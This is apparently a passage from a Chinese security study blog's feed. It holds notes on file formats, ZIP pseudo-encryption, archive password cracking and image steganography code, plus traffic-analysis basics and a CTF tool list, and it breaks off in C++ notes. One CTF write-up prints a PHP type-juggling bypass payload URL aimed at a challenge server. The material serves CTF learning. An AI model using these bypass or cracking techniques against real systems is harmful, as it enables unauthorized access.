        <content type="html"><![CDATA[<h1 id="File理论"><a href="#File理论" class="headerlink" title="File理论"></a>File理论</h1><blockquote><p><a href=".\a2cc6fde">text::文件工具</a></p></blockquote><hr><h2 id="一、其他"><a href="#一、其他" class="headerlink" title="一、其他"></a>一、其他</h2><h3 id="1-十六进制"><a href="#1-十六进制" class="headerlink" title="1 十六进制"></a>1 十六进制</h3><blockquote><p>注意十六进制数是否大于 0x7b ，大于的话可能要 % 128。</p></blockquote><h3 id="2-flag别名"><a href="#2-flag别名" class="headerlink" title="2 flag别名"></a>2 flag别名</h3><blockquote><p>flag、f14g、f1ag、fl4g</p></blockquote><hr><h2 id="二、文件"><a href="#二、文件" class="headerlink" title="二、文件"></a>二、文件</h2><h3 id="1-文件基础"><a href="#1-文件基础" class="headerlink" title="1 文件基础"></a>1 文件基础</h3><ul><li><p>文件类型与关系</p><ul><li><p>图片文件</p><ul><li><p>.jpg：有损压缩 </p></li><li><p>.png：无损压缩</p></li><li><p>.bmp：无压缩</p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/260702527">BMP图像文件完全解析 - 知乎 (zhihu.com)</a></p></blockquote></li><li><p>.webp：仅Chrome支持的图片</p></li></ul></li><li><p>文本文件</p><ul><li>.doc：文档</li><li>.docx：扩展文档（可插pdf）</li><li>.pdf：可携带文件格式</li></ul></li><li><p>压缩包文件</p><blockquote><p><a href="https://www.cnblogs.com/itps/articles/12774936.html">详谈rar,zip,7z不同点以及优缺点</a></p></blockquote><ul><li>.7z：压缩率最高</li><li>.rar：安全性高</li><li>.zip：使用范围广</li></ul></li><li><p>音视频文件</p><ul><li>.wav：波形声音文件</li><li>.mp3：音频压缩技术</li><li>.mp4：动态图像专家组</li></ul></li><li><p>可扩展标识语言</p><ul><li>.xml：可扩展标识语言</li></ul></li><li><p>可执行文件</p><ul><li>.exe：可执行文件</li></ul></li></ul></li><li><p>文件头</p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/158980459">链接</a></p></blockquote><ul><li><p>jpg/jpeg</p><blockquote><p>头：FF D8 </p><p>尾：FF D9</p></blockquote></li><li><p>zip/jar/zipx</p><blockquote><p>头：50 4B 03 04</p></blockquote></li><li><p>pyc</p><blockquote><p>头：03 F3</p></blockquote></li></ul></li></ul><h3 id="2-压缩包"><a href="#2-压缩包" class="headerlink" title="2 压缩包"></a>2 压缩包</h3><h4 id="2-1-ZIP文件"><a href="#2-1-ZIP文件" class="headerlink" title="2.1 ZIP文件"></a>2.1 ZIP文件</h4><blockquote><p><a href="https://blog.csdn.net/a200710716/article/details/51644421">文件格式</a>    <a href="https://pkware.cachefly.net/webdocs/APPNOTE/APPNOTE-6.2.0.txt">官方文档</a>    <a href="https://blog.csdn.net/u012567068/article/details/73611526">压缩原理</a></p></blockquote><ul><li><p>压缩源文件信息</p><ul><li>数据区头：50 4B 03 04</li><li>目录区头：50 4B 01 02</li><li>目录结束标志头：50 4B 05 06</li></ul></li><li><p>伪加密</p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/399456259">伪加密</a></p><p>全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性。</p></blockquote><ul><li><p>第二个数字为奇数时 –&gt;加密</p><blockquote><p>数据区的全局方式位标记应当为 09 00</p><p>目录区的全局方式位标记应当为 09 00</p><p>数据区全局方位：7-8 B，目录区全局方位：9-10 B</p></blockquote></li><li><p>第二个数字为偶数时 –&gt;未加密</p><blockquote><p>数据区的全局方式位标记应当为 00 00</p><p>目录区的全局方式位标记应当为 00 00</p></blockquote></li></ul></li></ul><h4 id="2-2-RAR文件"><a href="#2-2-RAR文件" class="headerlink" title="2.2 RAR文件"></a>2.2 RAR文件</h4><h4 id="2-3-压缩包爆破"><a href="#2-3-压缩包爆破" class="headerlink" title="2.3 压缩包爆破"></a>2.3 压缩包爆破</h4><blockquote><p>伪加密：观察全局方位。</p></blockquote><ul><li><p>步骤</p><ol><li>用 010editor 进行编辑</li><li>binwalk -e 无视伪加密</li><li>在 macOS 及部分 Linux（kali） 中，可以直接打开伪加密的 zip</li><li>检测伪加密工具 ZipCenOp.jar</li><li>用 WinRAR 修复</li></ol></li><li><p>ARCHPR</p><ul><li><p>爆破攻击</p><blockquote><p>攻击类型暴力，选择范围，选择长度，开始暴力。</p></blockquote></li><li><p>字典攻击</p><blockquote><p>攻击类型字典，载入字典。</p></blockquote></li><li><p>掩码攻击</p><blockquote><p>攻击类型掩码，构造掩码，如（???venus??），? 会被字符代替。</p></blockquote></li><li><p>明文攻击</p><blockquote><p>攻击类型明文，选择 CRC32 值一致的明文文件，攻击同 CRC32 值的加密文件。</p></blockquote></li></ul></li></ul><h3 id="2-图片"><a href="#2-图片" class="headerlink" title="2 图片"></a>2 图片</h3><ul><li><p>二维码 &amp; 条形码</p><blockquote><p><a href="https://online-barcode-reader.inliteresearch.com/">识别网站</a></p></blockquote></li></ul><h3 id="3-Office"><a href="#3-Office" class="headerlink" title="3 Office"></a>3 Office</h3><ul><li><p>doc</p><ul><li><p>Question</p><ul><li><p>图片被文字遮挡</p><blockquote><p>设置全部行为单倍行距。</p></blockquote></li><li><p>wingdings字体<img src="/posts/71be2b51/wingdings.jpg" alt="img"></p></li></ul></li></ul></li><li><p>excel</p></li><li><p>ppt</p></li><li><p>pdf</p></li></ul><hr><h2 id="三、隐写"><a href="#三、隐写" class="headerlink" title="三、隐写"></a>三、隐写</h2><h3 id="1-常规步骤"><a href="#1-常规步骤" class="headerlink" title="1 常规步骤"></a>1 常规步骤</h3><ol><li>binwalk + WinHex：分析文件内部结构和内部数据。</li><li>StegSolve：分析LSB隐写。</li><li>Stegdetect：特殊隐写。</li></ol><h3 id="2-基本概念"><a href="#2-基本概念" class="headerlink" title="2 基本概念"></a>2 基本概念</h3><h4 id="2-1-信息隐藏"><a href="#2-1-信息隐藏" class="headerlink" title="2.1 信息隐藏"></a>2.1 信息隐藏</h4><ul><li><p>信息隐藏要求</p><blockquote><p>每当一个性质的能力得到提升，另外两个就会下降，所以要在三者中寻找一个平衡。</p></blockquote><ol><li>无法被感知。</li><li>隐写容量：足够用。</li><li>鲁棒性：抵御攻击能力。</li></ol></li><li><p>阈下信道</p><blockquote><p>定义：阈值以下的信息无法被感知。</p></blockquote></li></ul><h3 id="3-隐写类型"><a href="#3-隐写类型" class="headerlink" title="3 隐写类型"></a>3 隐写类型</h3><h4 id="3-1-图片隐写"><a href="#3-1-图片隐写" class="headerlink" title="3.1 图片隐写"></a>3.1 图片隐写</h4><blockquote><p><a href="https://github.com/Magialeaf/Misc/tree/main/Image/Hidden">My::隐写全例</a></p></blockquote><h5 id="3-1-1-基础隐写"><a href="#3-1-1-基础隐写" class="headerlink" title="3.1.1 基础隐写"></a>3.1.1 基础隐写</h5><blockquote><p>RGB：红绿蓝，三个通道，每个 8 位。值越小越黑，越大越白。（RGB888 / 三通道图 / BGR）</p><p>灰度图：单通道图像。（GRAY）</p><p>位图：0,1构成，只有黑白。</p><p>单通道：一个矩阵，每个位置存一个像素点信息，8b，每位会形成一张图像，越高位越影响图像外形，最终图像是由这8位图像共同组成。所以在低位隐写难以被发现。</p><p>LSB隐写指最低有效位隐写，通常只在无损压缩或无压缩的图片上实现LSB隐写。JPG无法LSB隐写。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 灰度隐写</span></span><br><span class="line"><span class="comment">// 获得低位值。</span></span><br><span class="line">img.<span class="built_in">at</span>(i, j) &amp; <span class="number">1</span>;</span><br><span class="line"><span class="comment">// 判断色彩丰富度。（分成黑白两种色用于隐写）</span></span><br><span class="line">logo.<span class="built_in">at</span>(i, j) &gt; <span class="number">128</span>;</span><br><span class="line"><span class="comment">// 修改低位值。（异或改掉最低位）</span></span><br><span class="line">img.<span class="built_in">at</span>(i, j) ^= <span class="number">1</span>;</span><br><span class="line"><span class="comment">// 明显显示低位值（0-&gt;0：黑色，1-&gt;255：白色）</span></span><br><span class="line">res.<span class="built_in">at</span>(i, j) *= <span class="number">255</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 彩色隐写</span></span><br><span class="line"><span class="comment">// 基本同理灰度隐写，：三通道隐写。（数组类型）</span></span><br><span class="line"><span class="comment">// 新定义一张图用来接收隐写后图的最低位值。（CV_8UC1：一个通道）</span></span><br><span class="line"><span class="function">Mat <span class="title">solve</span><span class="params">(row, col, CV_8UC1)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 联合隐写</span></span><br><span class="line">img.at[ now ];</span><br><span class="line"><span class="comment">// now = row_now / ((row / 3) + 1))（+1是防止越界）</span></span><br><span class="line"><span class="comment">// 或 now = row_now % 3</span></span><br><span class="line"><span class="comment">// 或直接改成加密函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可见水印</span></span><br><span class="line"><span class="comment">// 原理：改变透明度 a，让一张图片嵌在另一张图片上（a:double）</span></span><br><span class="line">Vec3b c = img_c * a + logo_c * (<span class="number">1</span> - a);</span><br></pre></td></tr></table></figure><h5 id="3-1-2-加密隐写"><a href="#3-1-2-加密隐写" class="headerlink" title="3.1.2 加密隐写"></a>3.1.2 加密隐写</h5><blockquote><p>———————Arnold置乱———————<br>Arnold置乱是一种映射方法。（Mapping）</p><p>矩阵运算如下（N是行列值，必须相等）：<br>[ x’ ] = [ 1       a    ] <em> [ x ] mod N<br>[ y’ ] = [ b   ab+1 ] </em> [ y ] mod N</p><p>逆矩阵：<br>[ x ] = [ ab+1  -b ] <em> [ x’ ] mod N<br>[ y ] = [   -a       1 ] </em> [ y’ ] mod N</p><p>周期性：次数 c &lt;= N ** 2 / 2，否则会重复置换。</p><p>联合隐写+ Arnold置乱：抗剪切性好，因为点是打散的。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 当 a = b = 1 时就是 Cat-mapping，写成行列式 如下：</span></span><br><span class="line">_x = ( x + y ) mod N;</span><br><span class="line">_y = ( x + <span class="number">2</span>*y ) mod N;</span><br><span class="line"><span class="comment">// 逆变换行列式：</span></span><br><span class="line">x = ( <span class="number">2</span>*_x -_y ) mod N;</span><br><span class="line">y = ( -_x + _y ) mod N;</span><br><span class="line"><span class="comment">// 注：C语言可能会算出负数，其他语言取模不会</span></span><br><span class="line">y =  (y+N) % N;</span><br></pre></td></tr></table></figure><h5 id="3-1-3-混沌序列"><a href="#3-1-3-混沌序列" class="headerlink" title="3.1.3 混沌序列"></a>3.1.3 混沌序列</h5><blockquote><p>混沌系统：是指那些在微小的初始条件下会呈现出长期不可预测的行为的非线性动力学系统。</p><p>混沌序列：序列，混乱，不可预测。（自然序列，斐波那契数列也是混沌序列，但混沌度低）</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 随机数置乱</span></span><br><span class="line"><span class="built_in">srand</span>(key);</span><br><span class="line">key = <span class="keyword">for</span>(key.<span class="built_in">at</span>&lt;uchar&gt;(i,j) = <span class="built_in">rand</span>() % <span class="number">256</span>); </span><br><span class="line"><span class="comment">// 加密</span></span><br><span class="line">hide = img ^ key;</span><br><span class="line"><span class="comment">// 解密</span></span><br><span class="line">img = hide ^ key;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 随机数生成：线性同余法（简单，混沌度高）（主要是 c，c 是大质数时周期就大）</span></span><br><span class="line"><span class="built_in">F</span>(n) = ( a * <span class="built_in">F</span>(n<span class="number">-1</span>) + b ) % c;</span><br><span class="line"><span class="comment">//使用时还需要取mod保证范围 </span></span><br><span class="line"><span class="built_in">F</span>(n) %= mod</span><br></pre></td></tr></table></figure><h5 id="3-1-4-序列隐写"><a href="#3-1-4-序列隐写" class="headerlink" title="3.1.4 序列隐写"></a>3.1.4 序列隐写</h5><ul><li><p>字符串隐写</p><blockquote><p>隐写：字符串可以和网络包一样加包头，隐写在任意位置的杂乱信息中。读取时可以按长度读取，也可以读取过长长度找到该字符串。</p><p>特点：隐蔽性和容量大，鲁棒性较差。</p></blockquote></li><li><p>载体选择</p><ol><li><p>最低有效位。</p></li><li><p>选择纹理丰富区域，而非光滑区域。</p><blockquote><p>纹理值计算：计算梯度出现纹理线。</p></blockquote></li><li><p>颜色区域。鲜艳区域少嵌入，阴沉区域多嵌入。</p></li><li><p>随机选择载体。（类似分子不规则运动）</p><blockquote><p>序列：隐写的序列为二进制序列，因为要隐写在最低位。</p></blockquote></li></ol></li><li><p>梯度</p><blockquote><p>梯度：当前点值 - 上一像素点值 &gt; 临界值（例：10），纹理就会出现。</p><p>上一值：上下左右皆可。</p><p>联合梯度：上一值选为上和左，将计算结果加起来，判断是否大于临界值。</p></blockquote><ol><li><p>二值图片</p><p><code>((img.at&lt;uchar&gt;(i, j) - img.at&lt;uchar&gt;(i-1, j))&gt;10) *255;</code></p></li><li><p>防负图片</p><p><code>(abs(img.at&lt;uchar&gt;(i, j) - img.at&lt;uchar&gt;(i-1,j))) *10;</code></p></li></ol></li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// StrtoBin</span></span><br><span class="line">num = ((key[i] &amp; (<span class="number">1</span> &lt;&lt; (<span class="number">7</span> - j))) &gt; <span class="number">0</span>);</span><br><span class="line"><span class="comment">// BintoStr</span></span><br><span class="line">temp = temp * <span class="number">2</span> + key_bin[i+j];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Encode</span></span><br><span class="line">last_bit = last_bit - (last_bit &amp; <span class="number">1</span>);</span><br><span class="line">last_bit |= vector[p];</span><br><span class="line"><span class="comment">// Decode</span></span><br><span class="line">temp += res.<span class="built_in">at</span>&lt;uchar&gt;(i, j) &amp; <span class="number">1</span>;</span><br><span class="line">string += temp;</span><br></pre></td></tr></table></figure><h5 id="3-1-5-矩阵编码"><a href="#3-1-5-矩阵编码" class="headerlink" title="3.1.5 矩阵编码"></a>3.1.5 矩阵编码</h5><p><strong>改1嵌2</strong></p><blockquote><p>目的：a1,a2,a3,x1,x2。只改一个a嵌入两个x。</p><p>通过算期望判断好坏：LSB单隐写 50% 概率改1个，改1嵌2矩阵隐写 75% 改 2 个。因此该隐写优于LSB单隐写。</p></blockquote><ul><li>嵌入<ol><li>x1 = a1 ^ a3 , x2 = a2 ^ a3 ; a 不变。</li><li>x1 != a1 ^ a3 , x2 = a2 ^ a3 ; a1反。</li><li>x1 = a1 ^ a3 , x2 != a2 ^ a3 ; a2反。</li><li>x1 != a1 ^ a3 , x2 != a2 ^ a3 ; a3反。</li></ol></li><li>提取：<ul><li>x1 = a1 ^ a3 , x2 = a2 ^  a3 ;</li></ul></li></ul><p><strong>改1嵌n</strong></p><blockquote><p>目的：a1-a7,x1,x2,x3。只改1个a嵌入三个x。</p><p>案例：假设你是一名科研人员，有64瓶无色无味的溶液，其中1瓶有毒，已知小白鼠喝下溶液后第二天会死，现在需要你分析出哪瓶为有毒溶液。小白鼠可以同时喝下多瓶溶液，问：至少需要多少只小白鼠。</p><p>答案：6只，二进制序列。</p><script type="math/tex; mode=display">\left[\begin{array}{c|cc}0&0&0&0&1&1&1&1\\0&0&1&1&0&0&1&1\\0&1&0&1&0&1&0&1\end{array}\right]</script><p>汉明纠错码：4bit数据3bit冗余。</p><p>分组奇偶：对应上面矩阵异或值为0</p><p>1：1357列异或。</p><p>2：2367列异或。</p><p>4：4567列异或。</p></blockquote><div class="table-container"><table><thead><tr><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th></tr></thead><tbody><tr><td>3</td><td>2</td><td>data</td><td>1</td><td>data</td><td>data</td><td>data</td></tr></tbody></table></div><blockquote><ul><li>数学原理如下：</li></ul><script type="math/tex; mode=display">f(a)=\left[\begin{array}{c|cc}0&0&0&0&1&1&1&1\\0&0&1&1&0&0&1&1\\0&1&0&1&0&1&0&1\end{array}\right]*\left[\begin{array}{c}a1\\a2\\a3\\a4\\a5\\a6\\a7\end{array}\right]=\left[\begin{array}{c}z1\\z2\\z3\end{array}\right]</script><script type="math/tex; mode=display">s=\left[\begin{array}{c}z1\\z2\\z3\end{array}\right]\oplus\left[\begin{array}{c}z1\\z2\\z3\end{array}\right]=\left[\begin{array}{c}z1\\z2\\z3\end{array}\right]</script><p>异或双方分别是原数据和新数据分别与左边矩阵乘算的结果，然后再进行异或后发现需要进行改正的数据，从而完成隐写。</p><ul><li>公式表达如下：</li></ul><script type="math/tex; mode=display">f(a) =\bigotimes_{i=1}^n a_i*i</script><script type="math/tex; mode=display">s=x \oplus f(a)</script><script type="math/tex; mode=display">a'=[a_1,a_2,...,a_s,a_{s+1},...,a_n]</script></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 改正数据完成一个单位数据的隐写</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">EnMatrixCode</span><span class="params">(vector&lt;<span class="type">int</span>&gt; a, vector&lt;<span class="type">int</span>&gt; x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n = a.<span class="built_in">size</span>(), m = x.<span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">assert</span>(n == (<span class="number">1</span> &lt;&lt; m) - <span class="number">1</span>); <span class="comment">// n == 2 ^ m - 1</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fa = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">fa ^= (a[i - <span class="number">1</span>] * i);</span><br><span class="line"><span class="type">int</span> xx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">xx += x[i] * (<span class="number">1</span> &lt;&lt; i);</span><br><span class="line"><span class="keyword">return</span> fa ^ xx;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 逆改正</span></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">DeMatrix</span><span class="params">(vector&lt;<span class="type">int</span>&gt; a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n = a.<span class="built_in">size</span>();</span><br><span class="line"><span class="type">int</span> m = <span class="built_in">log2</span>(n + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; x;</span><br><span class="line"><span class="type">int</span> fa = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">fa ^= (a[i - <span class="number">1</span>] * i);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++)</span><br><span class="line">&#123;</span><br><span class="line">x.<span class="built_in">push_back</span>(fa % <span class="number">2</span>);</span><br><span class="line">fa /= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-2-音频隐写"><a href="#3-2-音频隐写" class="headerlink" title="3.2 音频隐写"></a>3.2 音频隐写</h4>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 文件分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流量分析理论</title>
      <link href="/posts/7ab8e472.html"/>
      <url>/posts/7ab8e472.html</url>
      
        <content type="html"><![CDATA[<h1 id="Flow理论"><a href="#Flow理论" class="headerlink" title="Flow理论"></a>Flow理论</h1><blockquote><p><a href=".\f60fa43a">text::流量工具</a></p></blockquote><hr><h2 id="一、流量分析"><a href="#一、流量分析" class="headerlink" title="一、流量分析"></a>一、流量分析</h2><blockquote><p><a href="https://www.cnblogs.com/pangya/p/9936024.html">基础</a>    <a href="https://blog.csdn.net/qq_32393893/article/details/117574848">思路</a></p></blockquote><h3 id="1-暴力破解"><a href="#1-暴力破解" class="headerlink" title="1 暴力破解"></a>1 暴力破解</h3><ul><li><p>方法</p><ol><li><p>wireshark——编辑查找——分组字节流——flag</p></li><li><p>记事本打开查找 flag</p></li></ol></li></ul><h3 id="2-普通分析"><a href="#2-普通分析" class="headerlink" title="2 普通分析"></a>2 普通分析</h3><ul><li><ol><li>首先分析协议和包长，长度出现一次的包可疑。</li><li>数据段之和。</li></ol></li><li>扫描分析<ol><li>icmp：ping。</li><li>tcp：半连接，全连接。</li></ol></li></ul><hr><h2 id="二、流量协议"><a href="#二、流量协议" class="headerlink" title="二、流量协议"></a>二、流量协议</h2><h3 id="1、TLS"><a href="#1、TLS" class="headerlink" title="1、TLS"></a>1、TLS</h3><blockquote><p>https的加密协议</p><p>SSL/TLS是一种密码通信框架，他是世界上使用最广泛的密码通信方法。SSL/TLS综合运用了密码学中的对称密码，消息认证码，公钥密码，数字签名，伪随机数生成器等，可以说是密码学中的集大成者。</p><p>SSL(Secure Socket Layer)安全套接层，是1994年由Netscape公司设计的一套协议，并与1995年发布了3.0版本。</p><p>TLS(Transport Layer Security)传输层安全是IETF在SSL3.0基础上设计的协议，实际上相当于SSL的后续版本。</p><p><a href="https://zhuanlan.zhihu.com/p/133375078">一篇文章让你彻底弄懂SSL/TLS协议 - 知乎 (zhihu.com)</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF例题</title>
      <link href="/posts/2b0d66fa.html"/>
      <url>/posts/2b0d66fa.html</url>
      
        <content type="html"><![CDATA[<h1 id="CTF例题"><a href="#CTF例题" class="headerlink" title="CTF例题"></a>CTF例题</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-反序列化"><a href="#1-反序列化" class="headerlink" title="1 反序列化"></a>1 反序列化</h3><blockquote><p><a href="https://adworld.xctf.org.cn/challenges/list">攻防世界</a>：unseping，<a href="https://www.cnblogs.com/niyani/p/16961716.html">unseping题解</a></p></blockquote><h3 id="2-easyphp"><a href="#2-easyphp" class="headerlink" title="2 easyphp"></a>2 easyphp</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>) &gt; <span class="number">6000000</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>) &lt;= <span class="number">3</span>);</span><br><span class="line"><span class="comment"># a = 1e8（科学计数法）</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))；</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&lt;?php</span></span><br><span class="line"><span class="comment">for($b = 0;$b &lt; 1000000;$b++)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    echo $b;</span></span><br><span class="line"><span class="comment">    echo &quot;&lt;br/&gt;&quot;;</span></span><br><span class="line"><span class="comment">    if($b &amp;&amp; &#x27;8b184b&#x27; === substr(md5($b),-6,6))</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        break;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">?&gt;</span></span><br><span class="line"><span class="comment">$b = 53724;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    </span><br><span class="line"><span class="number">3</span>.<span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>);</span><br><span class="line"><span class="comment"># m = 2044a（作为字符串输入）</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>.<span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]));</span><br><span class="line"><span class="comment"># n = array(array(&quot;1&quot;),0))（array_search实则是比较，字符串和整数比较字符串会转化成整数）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&lt;?php</span></span><br><span class="line"><span class="comment">$origin = json_encode(array(&quot;m&quot; =&gt; &quot;2044a&quot;, &quot;n&quot; =&gt; array(array(&quot;1&quot;),0)));</span></span><br><span class="line"><span class="comment">echo $origin;</span></span><br><span class="line"><span class="comment">?&gt;</span></span><br><span class="line"><span class="comment">$c = &#123;&quot;m&quot;:&quot;2044a&quot;,&quot;n&quot;:[[&quot;1&quot;],0]&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// payload：http://61.147.171.105:55516?a=1e8&amp;b=53724&amp;c=&#123;&quot;m&quot;:&quot;2044a&quot;,&quot;n&quot;:[[&quot;1&quot;],0]&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF案例 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 安全实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF工具</title>
      <link href="/posts/d5a2797b.html"/>
      <url>/posts/d5a2797b.html</url>
      
        <content type="html"><![CDATA[<h1 id="CTF工具"><a href="#CTF工具" class="headerlink" title="CTF工具"></a>CTF工具</h1><h2 id="启动器Rolan"><a href="#启动器Rolan" class="headerlink" title="启动器Rolan"></a>启动器Rolan</h2><blockquote><p>BUG1：左键点击无法启动。</p><p>解决：右键——管理员运行——取消。</p></blockquote><h2 id="File"><a href="#File" class="headerlink" title="File"></a>File</h2><blockquote><p><a href=".\a2cc6fde">text::文件工具</a></p></blockquote><ul><li>Stegsolve</li><li>AU</li><li>CQR</li><li>ARCHPR*3</li><li>010PotPlayer</li><li>gifsplitter</li><li>SpaceSniffer</li><li>Snipaste</li><li>ClearImage </li></ul><h2 id="Internet"><a href="#Internet" class="headerlink" title="Internet"></a>Internet</h2><blockquote><p> <a href=".\f60fa43a">text::流量工具</a></p></blockquote><ul><li><p>Wireshare</p></li><li><p>putty：<a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">安装</a></p><blockquote><p>使用：ip地址——SSH协议。</p></blockquote></li></ul><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><blockquote><p><a href=".\e3bc6d90">text::Crypto工具</a></p></blockquote><ul><li>yafu-1</li><li>CTF-Tools</li><li>CaptfEncoder</li><li>小葵转化器</li><li>Converter</li></ul><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><blockquote><p><a href=".\68e517a">text::Reverse工具</a></p></blockquote><ul><li>(吾爱破解) </li><li>die</li><li>ida</li><li>CE</li><li>金手指</li></ul><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><blockquote><p><a href=".\5cfe0bd9">text::Web渗透工具</a></p></blockquote><ul><li>PHPStudy</li><li>firefox</li><li>BurpSuit</li><li>Antsword</li><li>御剑后台扫描</li><li>御剑高速端口</li><li>御剑WEB指纹</li><li>curl</li><li>Acunetix</li></ul><h2 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h2><ul><li>VMware</li><li>SQLserver</li><li>Windscribe</li><li>Github</li><li>battoexe</li><li>连点器</li><li>格式工厂</li></ul><h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><ul><li>AndroidKiller</li><li>ApkToolBox</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF案例 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 安全实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++</title>
      <link href="/posts/5751eea2.html"/>
      <url>/posts/5751eea2.html</url>
      
        <content type="html"><![CDATA[<h1 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h1><blockquote><p><a href=".\4b0178e0">text::数据结构与算法</a></p></blockquote><hr><h2 id="一、C语言"><a href="#一、C语言" class="headerlink" title="一、C语言"></a>一、C语言</h2><h3 id="0-基础"><a href="#0-基础" class="headerlink" title="0 基础"></a>0 基础</h3><blockquote><p>单行注释：<code>//</code></p><p>多行注释：<code>/**/</code></p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引用头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 宏定义常量（）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 常量名 常量值</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PI 3.14</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// #define性质</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> x 5</span></span><br><span class="line"><span class="meta">#<span 